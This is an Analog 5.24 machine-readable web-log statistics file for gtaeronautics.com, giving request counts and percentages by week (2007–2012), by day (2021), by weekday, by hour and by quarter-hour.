x	VE	analog 5.24
x	HN	gtaeronautics.com
W	Rr	1050	0.109	2012	06	17
W	Rr	1271	0.132	2012	06	10
W	Rr	957	0.099	2012	06	03
W	Rr	1249	0.130	2012	05	27
W	Rr	1055	0.110	2012	05	20
W	Rr	1392	0.144	2012	05	13
W	Rr	1140	0.118	2012	05	06
W	Rr	1807	0.188	2012	04	29
W	Rr	1225	0.127	2012	04	22
W	Rr	1264	0.131	2012	04	15
W	Rr	1075	0.112	2012	04	08
W	Rr	1261	0.131	2012	04	01
W	Rr	1345	0.140	2012	03	25
W	Rr	1254	0.130	2012	03	18
W	Rr	1478	0.153	2012	03	11
W	Rr	1503	0.156	2012	03	04
W	Rr	1532	0.159	2012	02	26
W	Rr	1464	0.152	2012	02	19
W	Rr	1154	0.120	2012	02	12
W	Rr	1240	0.129	2012	02	05
W	Rr	1088	0.113	2012	01	29
W	Rr	1125	0.117	2012	01	22
W	Rr	60	0.006	2012	01	15
W	Rr	1472	0.153	2012	01	08
W	Rr	1122	0.116	2012	01	01
W	Rr	888	0.092	2011	12	25
W	Rr	1360	0.141	2011	12	18
W	Rr	1486	0.154	2011	12	11
W	Rr	1330	0.138	2011	12	04
W	Rr	1094	0.114	2011	11	27
W	Rr	1062	0.110	2011	11	20
W	Rr	1123	0.117	2011	11	13
W	Rr	975	0.101	2011	11	06
W	Rr	1264	0.131	2011	10	30
W	Rr	1140	0.118	2011	10	23
W	Rr	1211	0.126	2011	10	16
W	Rr	1236	0.128	2011	10	09
W	Rr	1128	0.117	2011	10	02
W	Rr	1083	0.112	2011	09	25
W	Rr	1451	0.151	2011	09	18
W	Rr	1278	0.133	2011	09	11
W	Rr	1219	0.127	2011	09	04
W	Rr	1316	0.137	2011	08	28
W	Rr	1119	0.116	2011	08	21
W	Rr	1484	0.154	2011	08	14
W	Rr	1671	0.173	2011	08	07
W	Rr	1319	0.137	2011	07	31
W	Rr	1197	0.124	2011	07	24
W	Rr	1504	0.156	2011	07	17
W	Rr	1367	0.142	2011	07	10
W	Rr	1205	0.125	2011	07	03
W	Rr	1333	0.138	2011	06	26
W	Rr	1059	0.110	2011	06	19
W	Rr	1353	0.140	2011	06	12
W	Rr	1275	0.132	2011	06	05
W	Rr	983	0.102	2011	05	29
W	Rr	1262	0.131	2011	05	22
W	Rr	1374	0.143	2011	05	15
W	Rr	1076	0.112	2011	05	08
W	Rr	0	0.000	2011	05	01
W	Rr	0	0.000	2011	04	24
W	Rr	0	0.000	2011	04	17
W	Rr	0	0.000	2011	04	10
W	Rr	0	0.000	2011	04	03
W	Rr	0	0.000	2011	03	27
W	Rr	24	0.002	2011	03	20
W	Rr	1317	0.137	2011	03	13
W	Rr	1258	0.131	2011	03	06
W	Rr	1372	0.142	2011	02	27
W	Rr	1226	0.127	2011	02	20
W	Rr	1524	0.158	2011	02	13
W	Rr	1366	0.142	2011	02	06
W	Rr	958	0.099	2011	01	30
W	Rr	1273	0.132	2011	01	23
W	Rr	1560	0.162	2011	01	16
W	Rr	1472	0.153	2011	01	09
W	Rr	1310	0.136	2011	01	02
W	Rr	798	0.083	2010	12	26
W	Rr	935	0.097	2010	12	19
W	Rr	0	0.000	2010	12	12
W	Rr	0	0.000	2010	12	05
W	Rr	0	0.000	2010	11	28
W	Rr	0	0.000	2010	11	21
W	Rr	0	0.000	2010	11	14
W	Rr	0	0.000	2010	11	07
W	Rr	0	0.000	2010	10	31
W	Rr	0	0.000	2010	10	24
W	Rr	0	0.000	2010	10	17
W	Rr	0	0.000	2010	10	10
W	Rr	0	0.000	2010	10	03
W	Rr	0	0.000	2010	09	26
W	Rr	0	0.000	2010	09	19
W	Rr	0	0.000	2010	09	12
W	Rr	0	0.000	2010	09	05
W	Rr	0	0.000	2010	08	29
W	Rr	0	0.000	2010	08	22
W	Rr	0	0.000	2010	08	15
W	Rr	0	0.000	2010	08	08
W	Rr	0	0.000	2010	08	01
W	Rr	0	0.000	2010	07	25
W	Rr	0	0.000	2010	07	18
W	Rr	0	0.000	2010	07	11
W	Rr	0	0.000	2010	07	04
W	Rr	15	0.002	2010	06	27
W	Rr	914	0.095	2010	06	20
W	Rr	1104	0.115	2010	06	13
W	Rr	1096	0.114	2010	06	06
W	Rr	1171	0.122	2010	05	30
W	Rr	1115	0.116	2010	05	23
W	Rr	1170	0.121	2010	05	16
W	Rr	1334	0.138	2010	05	09
W	Rr	1109	0.115	2010	05	02
W	Rr	1067	0.111	2010	04	25
W	Rr	1212	0.126	2010	04	18
W	Rr	1054	0.109	2010	04	11
W	Rr	1325	0.138	2010	04	04
W	Rr	811	0.084	2010	03	28
W	Rr	1195	0.124	2010	03	21
W	Rr	1338	0.139	2010	03	14
W	Rr	1113	0.116	2010	03	07
W	Rr	1103	0.114	2010	02	28
W	Rr	1290	0.134	2010	02	21
W	Rr	0	0.000	2010	02	14
W	Rr	0	0.000	2010	02	07
W	Rr	0	0.000	2010	01	31
W	Rr	0	0.000	2010	01	24
W	Rr	0	0.000	2010	01	17
W	Rr	0	0.000	2010	01	10
W	Rr	0	0.000	2010	01	03
W	Rr	78	0.008	2009	12	27
W	Rr	945	0.098	2009	12	20
W	Rr	1140	0.118	2009	12	13
W	Rr	1323	0.137	2009	12	06
W	Rr	1518	0.158	2009	11	29
W	Rr	1352	0.140	2009	11	22
W	Rr	1346	0.140	2009	11	15
W	Rr	1416	0.147	2009	11	08
W	Rr	1734	0.180	2009	11	01
W	Rr	1035	0.107	2009	10	25
W	Rr	1297	0.135	2009	10	18
W	Rr	1267	0.132	2009	10	11
W	Rr	1440	0.149	2009	10	04
W	Rr	1521	0.158	2009	09	27
W	Rr	1121	0.116	2009	09	20
W	Rr	875	0.091	2009	09	13
W	Rr	1032	0.107	2009	09	06
W	Rr	1283	0.133	2009	08	30
W	Rr	1214	0.126	2009	08	23
W	Rr	1402	0.146	2009	08	16
W	Rr	1260	0.131	2009	08	09
W	Rr	1404	0.146	2009	08	02
W	Rr	1380	0.143	2009	07	26
W	Rr	1470	0.153	2009	07	19
W	Rr	1750	0.182	2009	07	12
W	Rr	1847	0.192	2009	07	05
W	Rr	1889	0.196	2009	06	28
W	Rr	1312	0.136	2009	06	21
W	Rr	1093	0.113	2009	06	14
W	Rr	1363	0.141	2009	06	07
W	Rr	1251	0.130	2009	05	31
W	Rr	1352	0.140	2009	05	24
W	Rr	1133	0.118	2009	05	17
W	Rr	1887	0.196	2009	05	10
W	Rr	1369	0.142	2009	05	03
W	Rr	1089	0.113	2009	04	26
W	Rr	1160	0.120	2009	04	19
W	Rr	1189	0.123	2009	04	12
W	Rr	1529	0.159	2009	04	05
W	Rr	1155	0.120	2009	03	29
W	Rr	1230	0.128	2009	03	22
W	Rr	1029	0.107	2009	03	15
W	Rr	1234	0.128	2009	03	08
W	Rr	1486	0.154	2009	03	01
W	Rr	1470	0.153	2009	02	22
W	Rr	1198	0.124	2009	02	15
W	Rr	1802	0.187	2009	02	08
W	Rr	1653	0.172	2009	02	01
W	Rr	1346	0.140	2009	01	25
W	Rr	1431	0.149	2009	01	18
W	Rr	1678	0.174	2009	01	11
W	Rr	1591	0.165	2009	01	04
W	Rr	886	0.092	2008	12	28
W	Rr	1148	0.119	2008	12	21
W	Rr	1428	0.148	2008	12	14
W	Rr	1508	0.157	2008	12	07
W	Rr	1194	0.124	2008	11	30
W	Rr	1070	0.111	2008	11	23
W	Rr	1396	0.145	2008	11	16
W	Rr	1255	0.130	2008	11	09
W	Rr	1314	0.136	2008	11	02
W	Rr	1397	0.145	2008	10	26
W	Rr	1638	0.170	2008	10	19
W	Rr	1298	0.135	2008	10	12
W	Rr	430	0.045	2008	10	05
W	Rr	723	0.075	2008	09	28
W	Rr	1308	0.136	2008	09	21
W	Rr	1242	0.129	2008	09	14
W	Rr	1409	0.146	2008	09	07
W	Rr	1142	0.119	2008	08	31
W	Rr	1022	0.106	2008	08	24
W	Rr	1062	0.110	2008	08	17
W	Rr	1188	0.123	2008	08	10
W	Rr	1232	0.128	2008	08	03
W	Rr	1050	0.109	2008	07	27
W	Rr	1272	0.132	2008	07	20
W	Rr	1305	0.135	2008	07	13
W	Rr	1093	0.113	2008	07	06
W	Rr	1182	0.123	2008	06	29
W	Rr	1937	0.201	2008	06	22
W	Rr	1493	0.155	2008	06	15
W	Rr	1083	0.112	2008	06	08
W	Rr	1283	0.133	2008	06	01
W	Rr	1432	0.149	2008	05	25
W	Rr	1726	0.179	2008	05	18
W	Rr	1580	0.164	2008	05	11
W	Rr	2661	0.276	2008	05	04
W	Rr	3648	0.379	2008	04	27
W	Rr	1400	0.145	2008	04	20
W	Rr	1365	0.142	2008	04	13
W	Rr	1213	0.126	2008	04	06
W	Rr	1670	0.173	2008	03	30
W	Rr	1211	0.126	2008	03	23
W	Rr	1144	0.119	2008	03	16
W	Rr	1301	0.135	2008	03	09
W	Rr	1292	0.134	2008	03	02
W	Rr	1427	0.148	2008	02	24
W	Rr	2207	0.229	2008	02	17
W	Rr	1124	0.117	2008	02	10
W	Rr	1561	0.162	2008	02	03
W	Rr	1533	0.159	2008	01	27
W	Rr	1389	0.144	2008	01	20
W	Rr	1133	0.118	2008	01	13
W	Rr	1404	0.146	2008	01	06
W	Rr	976	0.101	2007	12	30
W	Rr	801	0.083	2007	12	23
W	Rr	675	0.070	2007	12	16
W	*BT	R	7060	2014	02	16
D	Rr	451	0.047	2021	07	02
D	Rr	305	0.032	2021	07	01
D	Rr	507	0.053	2021	06	30
D	Rr	474	0.049	2021	06	29
D	Rr	399	0.041	2021	06	28
D	Rr	388	0.040	2021	06	27
D	Rr	0	0.000	2021	06	26
D	Rr	512	0.053	2021	06	25
D	Rr	330	0.034	2021	06	24
D	Rr	344	0.036	2021	06	23
D	Rr	462	0.048	2021	06	22
D	Rr	402	0.042	2021	06	21
D	Rr	416	0.043	2021	06	20
D	Rr	0	0.000	2021	06	19
D	Rr	362	0.038	2021	06	18
D	Rr	542	0.056	2021	06	17
D	Rr	259	0.027	2021	06	16
D	Rr	386	0.040	2021	06	15
D	Rr	389	0.040	2021	06	14
D	Rr	324	0.034	2021	06	13
D	Rr	0	0.000	2021	06	12
D	Rr	401	0.042	2021	06	11
D	Rr	388	0.040	2021	06	10
D	Rr	473	0.049	2021	06	09
D	Rr	370	0.038	2021	06	08
D	Rr	402	0.042	2021	06	07
D	Rr	230	0.024	2021	06	06
D	Rr	0	0.000	2021	06	05
D	Rr	285	0.030	2021	06	04
D	Rr	352	0.037	2021	06	03
D	Rr	303	0.031	2021	06	02
D	Rr	452	0.047	2021	06	01
D	Rr	386	0.040	2021	05	31
D	Rr	323	0.034	2021	05	30
D	Rr	0	0.000	2021	05	29
D	Rr	1295	0.134	2021	05	28
D	Rr	283	0.029	2021	05	27
D	Rr	340	0.035	2021	05	26
D	Rr	331	0.034	2021	05	25
D	Rr	361	0.037	2021	05	24
D	Rr	399	0.041	2021	05	23
D	Rr	0	0.000	2021	05	22
D	*BT	R	2131	2008	05	03
d	Rr	115003	11.937	Sun
d	Rr	154434	16.029	Mon
d	Rr	157007	16.297	Tue
d	Rr	155235	16.113	Wed
d	Rr	156472	16.241	Thu
d	Rr	148265	15.389	Fri
d	Rr	77024	7.995	Sat
H	Rr	6	0.001	2021	07	02	23
H	Rr	38	0.004	2021	07	02	22
H	Rr	24	0.002	2021	07	02	21
H	Rr	30	0.003	2021	07	02	20
H	Rr	6	0.001	2021	07	02	19
H	Rr	12	0.001	2021	07	02	18
H	Rr	90	0.009	2021	07	02	17
H	Rr	85	0.009	2021	07	02	16
H	Rr	4	0.000	2021	07	02	15
H	Rr	7	0.001	2021	07	02	14
H	Rr	5	0.001	2021	07	02	13
H	Rr	14	0.001	2021	07	02	12
H	Rr	26	0.003	2021	07	02	11
H	Rr	11	0.001	2021	07	02	10
H	Rr	7	0.001	2021	07	02	09
H	Rr	4	0.000	2021	07	02	08
H	Rr	7	0.001	2021	07	02	07
H	Rr	19	0.002	2021	07	02	06
H	Rr	15	0.002	2021	07	02	05
H	Rr	5	0.001	2021	07	02	04
H	Rr	17	0.002	2021	07	02	03
H	Rr	8	0.001	2021	07	02	02
H	Rr	3	0.000	2021	07	02	01
H	Rr	8	0.001	2021	07	02	00
H	Rr	27	0.003	2021	07	01	23
H	Rr	24	0.002	2021	07	01	22
H	Rr	37	0.004	2021	07	01	21
H	Rr	29	0.003	2021	07	01	20
H	Rr	17	0.002	2021	07	01	19
H	Rr	11	0.001	2021	07	01	18
H	Rr	7	0.001	2021	07	01	17
H	Rr	8	0.001	2021	07	01	16
H	Rr	7	0.001	2021	07	01	15
H	Rr	9	0.001	2021	07	01	14
H	Rr	10	0.001	2021	07	01	13
H	Rr	3	0.000	2021	07	01	12
H	Rr	7	0.001	2021	07	01	11
H	Rr	7	0.001	2021	07	01	10
H	Rr	8	0.001	2021	07	01	09
H	Rr	11	0.001	2021	07	01	08
H	Rr	45	0.005	2021	07	01	07
H	Rr	9	0.001	2021	07	01	06
H	Rr	2	0.000	2021	07	01	05
H	Rr	4	0.000	2021	07	01	04
H	Rr	8	0.001	2021	07	01	03
H	Rr	7	0.001	2021	07	01	02
H	Rr	4	0.000	2021	07	01	01
H	Rr	4	0.000	2021	07	01	00
H	Rr	3	0.000	2021	06	30	23
H	Rr	6	0.001	2021	06	30	22
H	Rr	51	0.005	2021	06	30	21
H	Rr	4	0.000	2021	06	30	20
H	Rr	27	0.003	2021	06	30	19
H	Rr	16	0.002	2021	06	30	18
H	Rr	42	0.004	2021	06	30	17
H	Rr	35	0.004	2021	06	30	16
H	Rr	17	0.002	2021	06	30	15
H	Rr	8	0.001	2021	06	30	14
H	Rr	3	0.000	2021	06	30	13
H	Rr	3	0.000	2021	06	30	12
H	Rr	5	0.001	2021	06	30	11
H	Rr	6	0.001	2021	06	30	10
H	Rr	9	0.001	2021	06	30	09
H	Rr	39	0.004	2021	06	30	08
H	Rr	85	0.009	2021	06	30	07
H	Rr	8	0.001	2021	06	30	06
H	Rr	19	0.002	2021	06	30	05
H	Rr	5	0.001	2021	06	30	04
H	Rr	62	0.006	2021	06	30	03
H	Rr	18	0.002	2021	06	30	02
H	Rr	11	0.001	2021	06	30	01
H	Rr	25	0.003	2021	06	30	00
H	*BT	R	750	2020	12	11	23
h	Rr	37981	3.942	00
h	Rr	36762	3.816	01
h	Rr	37607	3.903	02
h	Rr	37008	3.841	03
h	Rr	36009	3.738	04
h	Rr	34058	3.535	05
h	Rr	33635	3.491	06
h	Rr	33305	3.457	07
h	Rr	32024	3.324	08
h	Rr	30523	3.168	09
h	Rr	30263	3.141	10
h	Rr	33771	3.505	11
h	Rr	34402	3.571	12
h	Rr	36405	3.779	13
h	Rr	42117	4.372	14
h	Rr	47384	4.918	15
h	Rr	50785	5.271	16
h	Rr	50733	5.266	17
h	Rr	51934	5.390	18
h	Rr	51448	5.340	19
h	Rr	51287	5.323	20
h	Rr	48026	4.985	21
h	Rr	44238	4.592	22
h	Rr	41735	4.332	23
4	Rr	2	0.000	2021	07	02	23	45
4	Rr	2	0.000	2021	07	02	23	30
4	Rr	0	0.000	2021	07	02	23	15
4	Rr	2	0.000	2021	07	02	23	00
4	Rr	1	0.000	2021	07	02	22	45
4	Rr	30	0.003	2021	07	02	22	30
4	Rr	3	0.000	2021	07	02	22	15
4	Rr	4	0.000	2021	07	02	22	00
4	Rr	20	0.002	2021	07	02	21	45
4	Rr	1	0.000	2021	07	02	21	30
4	Rr	2	0.000	2021	07	02	21	15
4	Rr	1	0.000	2021	07	02	21	00
4	Rr	3	0.000	2021	07	02	20	45
4	Rr	21	0.002	2021	07	02	20	30
4	Rr	3	0.000	2021	07	02	20	15
4	Rr	3	0.000	2021	07	02	20	00
4	Rr	1	0.000	2021	07	02	19	45
4	Rr	0	0.000	2021	07	02	19	30
4	Rr	1	0.000	2021	07	02	19	15
4	Rr	4	0.000	2021	07	02	19	00
4	Rr	4	0.000	2021	07	02	18	45
4	Rr	4	0.000	2021	07	02	18	30
4	Rr	1	0.000	2021	07	02	18	15
4	Rr	3	0.000	2021	07	02	18	00
4	Rr	1	0.000	2021	07	02	17	45
4	Rr	11	0.001	2021	07	02	17	30
4	Rr	5	0.001	2021	07	02	17	15
4	Rr	73	0.008	2021	07	02	17	00
4	Rr	7	0.001	2021	07	02	16	45
4	Rr	6	0.001	2021	07	02	16	30
4	Rr	47	0.005	2021	07	02	16	15
4	Rr	25	0.003	2021	07	02	16	00
4	Rr	2	0.000	2021	07	02	15	45
4	Rr	0	0.000	2021	07	02	15	30
4	Rr	1	0.000	2021	07	02	15	15
4	Rr	1	0.000	2021	07	02	15	00
4	Rr	1	0.000	2021	07	02	14	45
4	Rr	2	0.000	2021	07	02	14	30
4	Rr	3	0.000	2021	07	02	14	15
4	Rr	1	0.000	2021	07	02	14	00
4	Rr	1	0.000	2021	07	02	13	45
4	Rr	1	0.000	2021	07	02	13	30
4	Rr	1	0.000	2021	07	02	13	15
4	Rr	2	0.000	2021	07	02	13	00
4	Rr	2	0.000	2021	07	02	12	45
4	Rr	1	0.000	2021	07	02	12	30
4	Rr	2	0.000	2021	07	02	12	15
4	Rr	9	0.001	2021	07	02	12	00
4	Rr	4	0.000	2021	07	02	11	45
4	Rr	15	0.002	2021	07	02	11	30
4	Rr	4	0.000	2021	07	02	11	15
4	Rr	3	0.000	2021	07	02	11	00
4	Rr	4	0.000	2021	07	02	10	45
4	Rr	5	0.001	2021	07	02	10	30
4	Rr	0	0.000	2021	07	02	10	15
4	Rr	2	0.000	2021	07	02	10	00
4	Rr	3	0.000	2021	07	02	09	45
4	Rr	0	0.000	2021	07	02	09	30
4	Rr	1	0.000	2021	07	02	09	15
4	Rr	3	0.000	2021	07	02	09	00
4	Rr	1	0.000	2021	07	02	08	45
4	Rr	0	0.000	2021	07	02	08	30
4	Rr	3	0.000	2021	07	02	08	15
4	Rr	0	0.000	2021	07	02	08	00
4	Rr	1	0.000	2021	07	02	07	45
4	Rr	1	0.000	2021	07	02	07	30
4	Rr	0	0.000	2021	07	02	07	15
4	Rr	5	0.001	2021	07	02	07	00
4	Rr	16	0.002	2021	07	02	06	45
4	Rr	0	0.000	2021	07	02	06	30
4	Rr	1	0.000	2021	07	02	06	15
4	Rr	2	0.000	2021	07	02	06	00
4	Rr	1	0.000	2021	07	02	05	45
4	Rr	12	0.001	2021	07	02	05	30
4	Rr	2	0.000	2021	07	02	05	15
4	Rr	0	0.000	2021	07	02	05	00
4	Rr	1	0.000	2021	07	02	04	45
4	Rr	1	0.000	2021	07	02	04	30
4	Rr	2	0.000	2021	07	02	04	15
4	Rr	1	0.000	2021	07	02	04	00
4	Rr	1	0.000	2021	07	02	03	45
4	Rr	8	0.001	2021	07	02	03	30
4	Rr	6	0.001	2021	07	02	03	15
4	Rr	2	0.000	2021	07	02	03	00
4	Rr	0	0.000	2021	07	02	02	45
4	Rr	4	0.000	2021	07	02	02	30
4	Rr	1	0.000	2021	07	02	02	15
4	Rr	3	0.000	2021	07	02	02	00
4	Rr	0	0.000	2021	07	02	01	45
4	Rr	1	0.000	2021	07	02	01	30
4	Rr	0	0.000	2021	07	02	01	15
4	Rr	2	0.000	2021	07	02	01	00
4	Rr	1	0.000	2021	07	02	00	45
4	Rr	2	0.000	2021	07	02	00	30
4	Rr	3	0.000	2021	07	02	00	15
4	Rr	2	0.000	2021	07	02	00	00
4	*BT	R	744	2021	04	12	15	00
6	Rr	9446	0.980	00	00
6	Rr	9494	0.985	00	15
6	Rr	9330	0.968	00	30
6	Rr	9711	1.008	00	45
6	Rr	9130	0.948	01	00
6	Rr	9247	0.960	01	15
6	Rr	9342	0.970	01	30
6	Rr	9043	0.939	01	45
6	Rr	8957	0.930	02	00
6	Rr	9784	1.016	02	15
6	Rr	9577	0.994	02	30
6	Rr	9289	0.964	02	45
6	Rr	8995	0.934	03	00
6	Rr	8716	0.905	03	15
6	Rr	9051	0.939	03	30
6	Rr	10246	1.063	03	45
6	Rr	9023	0.937	04	00
6	Rr	9567	0.993	04	15
6	Rr	8403	0.872	04	30
6	Rr	9016	0.936	04	45
6	Rr	8245	0.856	05	00
6	Rr	9018	0.936	05	15
6	Rr	8680	0.901	05	30
6	Rr	8115	0.842	05	45
6	Rr	9162	0.951	06	00
6	Rr	8346	0.866	06	15
6	Rr	8364	0.868	06	30
6	Rr	7763	0.806	06	45
6	Rr	8429	0.875	07	00
6	Rr	8698	0.903	07	15
6	Rr	8687	0.902	07	30
6	Rr	7491	0.778	07	45
6	Rr	8120	0.843	08	00
6	Rr	7820	0.812	08	15
6	Rr	8560	0.888	08	30
6	Rr	7524	0.781	08	45
6	Rr	7704	0.800	09	00
6	Rr	7884	0.818	09	15
6	Rr	7682	0.797	09	30
6	Rr	7253	0.753	09	45
6	Rr	7292	0.757	10	00
6	Rr	7395	0.768	10	15
6	Rr	7580	0.787	10	30
6	Rr	7996	0.830	10	45
6	Rr	9500	0.986	11	00
6	Rr	7972	0.827	11	15
6	Rr	8014	0.832	11	30
6	Rr	8285	0.860	11	45
6	Rr	9595	0.996	12	00
6	Rr	8073	0.838	12	15
6	Rr	8280	0.859	12	30
6	Rr	8454	0.877	12	45
6	Rr	9007	0.935	13	00
6	Rr	8917	0.926	13	15
6	Rr	9575	0.994	13	30
6	Rr	8906	0.924	13	45
6	Rr	10113	1.050	14	00
6	Rr	10565	1.097	14	15
6	Rr	10674	1.108	14	30
6	Rr	10765	1.117	14	45
6	Rr	11816	1.226	15	00
6	Rr	11229	1.166	15	15
6	Rr	11934	1.239	15	30
6	Rr	12405	1.288	15	45
6	Rr	12518	1.299	16	00
6	Rr	12276	1.274	16	15
6	Rr	12877	1.337	16	30
6	Rr	13114	1.361	16	45
6	Rr	12798	1.328	17	00
6	Rr	12600	1.308	17	15
6	Rr	12922	1.341	17	30
6	Rr	12413	1.288	17	45
6	Rr	12493	1.297	18	00
6	Rr	13160	1.366	18	15
6	Rr	13171	1.367	18	30
6	Rr	13110	1.361	18	45
6	Rr	13949	1.448	19	00
6	Rr	12272	1.274	19	15
6	Rr	12746	1.323	19	30
6	Rr	12481	1.295	19	45
6	Rr	13272	1.378	20	00
6	Rr	12715	1.320	20	15
6	Rr	12204	1.267	20	30
6	Rr	13096	1.359	20	45
6	Rr	12826	1.331	21	00
6	Rr	11924	1.238	21	15
6	Rr	11478	1.191	21	30
6	Rr	11798	1.225	21	45
6	Rr	11155	1.158	22	00
6	Rr	11200	1.163	22	15
6	Rr	11047	1.147	22	30
6	Rr	10836	1.125	22	45
6	Rr	11125	1.155	23	00
6	Rr	11174	1.160	23	15
6	Rr	9952	1.033	23	30
6	Rr	9484	0.984	23	45
5	Rr	1	0.000	2021	07	02	23	55
5	Rr	0	0.000	2021	07	02	23	50
5	Rr	1	0.000	2021	07	02	23	45
5	Rr	0	0.000	2021	07	02	23	40
5	Rr	1	0.000	2021	07	02	23	35
5	Rr	1	0.000	2021	07	02	23	30
5	Rr	0	0.000	2021	07	02	23	25
5	Rr	0	0.000	2021	07	02	23	20
5	Rr	0	0.000	2021	07	02	23	15
5	Rr	2	0.000	2021	07	02	23	10
5	Rr	0	0.000	2021	07	02	23	05
5	Rr	0	0.000	2021	07	02	23	00
5	Rr	0	0.000	2021	07	02	22	55
5	Rr	0	0.000	2021	07	02	22	50
5	Rr	1	0.000	2021	07	02	22	45
5	Rr	29	0.003	2021	07	02	22	40
5	Rr	0	0.000	2021	07	02	22	35
5	Rr	1	0.000	2021	07	02	22	30
5	Rr	0	0.000	2021	07	02	22	25
5	Rr	2	0.000	2021	07	02	22	20
5	Rr	1	0.000	2021	07	02	22	15
5	Rr	0	0.000	2021	07	02	22	10
5	Rr	4	0.000	2021	07	02	22	05
5	Rr	0	0.000	2021	07	02	22	00
5	Rr	19	0.002	2021	07	02	21	55
5	Rr	0	0.000	2021	07	02	21	50
5	Rr	1	0.000	2021	07	02	21	45
5	Rr	0	0.000	2021	07	02	21	40
5	Rr	1	0.000	2021	07	02	21	35
5	Rr	0	0.000	2021	07	02	21	30
5	Rr	0	0.000	2021	07	02	21	25
5	Rr	0	0.000	2021	07	02	21	20
5	Rr	2	0.000	2021	07	02	21	15
5	Rr	0	0.000	2021	07	02	21	10
5	Rr	1	0.000	2021	07	02	21	05
5	Rr	0	0.000	2021	07	02	21	00
5	Rr	2	0.000	2021	07	02	20	55
5	Rr	1	0.000	2021	07	02	20	50
5	Rr	0	0.000	2021	07	02	20	45
5	Rr	1	0.000	2021	07	02	20	40
5	Rr	0	0.000	2021	07	02	20	35
5	Rr	20	0.002	2021	07	02	20	30
5	Rr	2	0.000	2021	07	02	20	25
5	Rr	0	0.000	2021	07	02	20	20
5	Rr	1	0.000	2021	07	02	20	15
5	Rr	1	0.000	2021	07	02	20	10
5	Rr	2	0.000	2021	07	02	20	05
5	Rr	0	0.000	2021	07	02	20	00
5	Rr	0	0.000	2021	07	02	19	55
5	Rr	1	0.000	2021	07	02	19	50
5	Rr	0	0.000	2021	07	02	19	45
5	Rr	0	0.000	2021	07	02	19	40
5	Rr	0	0.000	2021	07	02	19	35
5	Rr	0	0.000	2021	07	02	19	30
5	Rr	1	0.000	2021	07	02	19	25
5	Rr	0	0.000	2021	07	02	19	20
5	Rr	0	0.000	2021	07	02	19	15
5	Rr	0	0.000	2021	07	02	19	10
5	Rr	0	0.000	2021	07	02	19	05
5	Rr	4	0.000	2021	07	02	19	00
5	Rr	4	0.000	2021	07	02	18	55
5	Rr	0	0.000	2021	07	02	18	50
5	Rr	0	0.000	2021	07	02	18	45
5	Rr	3	0.000	2021	07	02	18	40
5	Rr	1	0.000	2021	07	02	18	35
5	Rr	0	0.000	2021	07	02	18	30
5	Rr	0	0.000	2021	07	02	18	25
5	Rr	0	0.000	2021	07	02	18	20
5	Rr	1	0.000	2021	07	02	18	15
5	Rr	2	0.000	2021	07	02	18	10
5	Rr	0	0.000	2021	07	02	18	05
5	Rr	1	0.000	2021	07	02	18	00
5	Rr	1	0.000	2021	07	02	17	55
5	Rr	0	0.000	2021	07	02	17	50
5	Rr	0	0.000	2021	07	02	17	45
5	Rr	0	0.000	2021	07	02	17	40
5	Rr	1	0.000	2021	07	02	17	35
5	Rr	10	0.001	2021	07	02	17	30
5	Rr	1	0.000	2021	07	02	17	25
5	Rr	2	0.000	2021	07	02	17	20
5	Rr	2	0.000	2021	07	02	17	15
5	Rr	20	0.002	2021	07	02	17	10
5	Rr	16	0.002	2021	07	02	17	05
5	Rr	37	0.004	2021	07	02	17	00
5	Rr	2	0.000	2021	07	02	16	55
5	Rr	2	0.000	2021	07	02	16	50
5	Rr	3	0.000	2021	07	02	16	45
5	Rr	3	0.000	2021	07	02	16	40
5	Rr	1	0.000	2021	07	02	16	35
5	Rr	2	0.000	2021	07	02	16	30
5	Rr	0	0.000	2021	07	02	16	25
5	Rr	2	0.000	2021	07	02	16	20
5	Rr	45	0.005	2021	07	02	16	15
5	Rr	1	0.000	2021	07	02	16	10
5	Rr	3	0.000	2021	07	02	16	05
5	Rr	21	0.002	2021	07	02	16	00
5	Rr	1	0.000	2021	07	02	15	55
5	Rr	0	0.000	2021	07	02	15	50
5	Rr	1	0.000	2021	07	02	15	45
5	Rr	0	0.000	2021	07	02	15	40
5	Rr	0	0.000	2021	07	02	15	35
5	Rr	0	0.000	2021	07	02	15	30
5	Rr	0	0.000	2021	07	02	15	25
5	Rr	1	0.000	2021	07	02	15	20
5	Rr	0	0.000	2021	07	02	15	15
5	Rr	0	0.000	2021	07	02	15	10
5	Rr	0	0.000	2021	07	02	15	05
5	Rr	1	0.000	2021	07	02	15	00
5	Rr	1	0.000	2021	07	02	14	55
5	Rr	0	0.000	2021	07	02	14	50
5	Rr	0	0.000	2021	07	02	14	45
5	Rr	1	0.000	2021	07	02	14	40
5	Rr	0	0.000	2021	07	02	14	35
